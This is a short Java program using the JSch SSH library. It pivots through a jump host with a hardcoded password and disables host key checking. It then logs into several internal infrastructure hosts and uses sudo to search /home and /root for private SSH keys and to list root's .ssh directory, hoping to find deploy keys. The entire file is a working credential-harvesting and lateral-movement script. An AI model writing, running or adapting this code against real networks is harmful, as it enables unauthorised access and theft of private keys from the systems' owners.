import com.jcraft.jsch.*;
import java.io.*;
class SSHG {
  static String exec(Session s, String cmd) throws Exception {
    ChannelExec ch = (ChannelExec) s.openChannel("exec");
    ch.setCommand(cmd);
    ch.setInputStream(null);
    InputStream in = ch.getInputStream();
    ch.connect();
    StringBuilder sb = new StringBuilder();
    byte[] buf = new byte[8192];
    int i;
    while ((i = in.read(buf)) != -1) sb.append(new String(buf, 0, i));
    ch.disconnect();
    return sb.toString();
  }
  public static void main(String[] a) throws Exception {
    JSch j = new JSch();
    java.util.Properties p = new java.util.Properties();
    p.put("StrictHostKeyChecking", "no");
    // Try infrastructure hosts - they might have deploy keys
    String[] targets = {"10.14.16.10","10.14.16.11","10.14.36.10","10.14.36.11","10.14.36.12"};
    for (String t : targets) {
      System.out.println("=== " + t + " ===");
      try {
        Session jump = j.getSession("user", "10.14.36.23", 22);
        jump.setPassword("kutul0nc4t");
        jump.setConfig(p);
        jump.setTimeout(10000);
        jump.connect();
        int fwd = jump.setPortForwardingL(0, t, 22);
        Session ts = j.getSession("user", "127.0.0.1", fwd);
        ts.setPassword("kutul0nc4t");
        ts.setConfig(p);
        ts.setTimeout(8000);
        ts.connect();
        String r = exec(ts, "hostname;echo kutul0nc4t | sudo -S find /home/ /root/ -name 'id_rsa' -o -name 'id_ed25519' 2>/dev/null;echo kutul0nc4t | sudo -S ls /root/.ssh/ 2>/dev/null");
        System.out.println(r);
        ts.disconnect();
        jump.disconnect();
      } catch (Exception e) {
        System.out.println("FAIL: " + e.getMessage());
      }
    }
  }
}
